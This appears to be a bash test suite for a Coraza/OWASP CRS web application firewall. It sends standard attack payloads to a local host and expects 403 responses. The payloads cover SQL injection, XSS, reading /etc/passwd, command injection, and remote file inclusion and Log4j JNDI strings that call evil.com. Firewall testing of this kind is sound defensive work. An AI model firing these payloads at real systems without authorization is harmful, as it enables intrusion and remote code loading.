#!/bin/bash

# ============================================================
# Test WAF (Coraza + OWASP CRS)
# Usage: ./test_waf.sh [URL]
# Default URL: http://whoami.local
# ============================================================

URL="${1:-http://whoami.local}"

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

pass=0
fail=0

test_payload() {
    local name="$1"
    local url="$2"
    local method="${3:-GET}"
    local data="$4"

    if [ "$method" == "POST" ]; then
        response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$url" -d "$data" 2>/dev/null)
    else
        response=$(curl -s -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)
    fi

    if [ "$response" == "403" ]; then
        echo -e "  ${GREEN}✓ PASS${NC} $name (HTTP $response)"
        ((pass++))
    else
        echo -e "  ${RED}✗ FAIL${NC} $name (HTTP $response, expected 403)"
        ((fail++))
    fi
}

echo -e "${YELLOW}═══════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}  WAF Test Suite — Coraza + OWASP CRS${NC}"
echo -e "${YELLOW}  Target: ${URL}${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════${NC}"
echo ""

# --- SQL Injection ---
echo -e "${YELLOW}[SQL Injection]${NC}"
test_payload "Union-based SQLi" "${URL}/?id=1%20UNION%20SELECT%201,2,3--"
test_payload "Error-based SQLi" "${URL}/?id=1'%20OR%20'1'='1"
test_payload "Blind SQLi" "${URL}/?id=1%20AND%201=1"
echo ""

# --- Cross-Site Scripting (XSS) ---
echo -e "${YELLOW}[Cross-Site Scripting (XSS)]${NC}"
test_payload "Reflected XSS" "${URL}/?q=<script>alert('xss')</script>"
test_payload "Event handler XSS" "${URL}/?q=<img%20src=x%20onerror=alert(1)>"
test_payload "SVG XSS" "${URL}/?q=<svg/onload=alert(1)>"
echo ""

# --- Local File Inclusion (LFI) ---
echo -e "${YELLOW}[Local File Inclusion (LFI)]${NC}"
test_payload "Path traversal" "${URL}/?file=../../etc/passwd"
test_payload "Null byte LFI" "${URL}/?file=../../../etc/passwd%00"
test_payload "Double encoding" "${URL}/?file=....//....//etc/passwd"
echo ""

# --- Remote Code Execution (RCE) ---
echo -e "${YELLOW}[Remote Code Execution (RCE)]${NC}"
test_payload "Command injection" "${URL}/?cmd=;ls%20-la"
test_payload "Pipe injection" "${URL}/?cmd=|cat%20/etc/passwd"
test_payload "Backtick injection" "${URL}/?cmd=\`whoami\`"
echo ""

# --- Remote File Inclusion (RFI) ---
echo -e "${YELLOW}[Remote File Inclusion (RFI)]${NC}"
test_payload "Remote include" "${URL}/?page=http://evil.com/shell.txt"
echo ""

# --- Log4j / JNDI ---
echo -e "${YELLOW}[Log4j / JNDI Injection]${NC}"
test_payload "JNDI LDAP" "${URL}/" "POST" '${jndi:ldap://evil.com/a}'
test_payload "JNDI RMI" "${URL}/" "POST" '${jndi:rmi://evil.com/a}'
echo ""

# --- Summary ---
echo -e "${YELLOW}═══════════════════════════════════════════════════${NC}"
total=$((pass + fail))
echo -e "  Results: ${GREEN}${pass} passed${NC} / ${RED}${fail} failed${NC} / ${total} total"
echo -e "${YELLOW}═══════════════════════════════════════════════════${NC}"
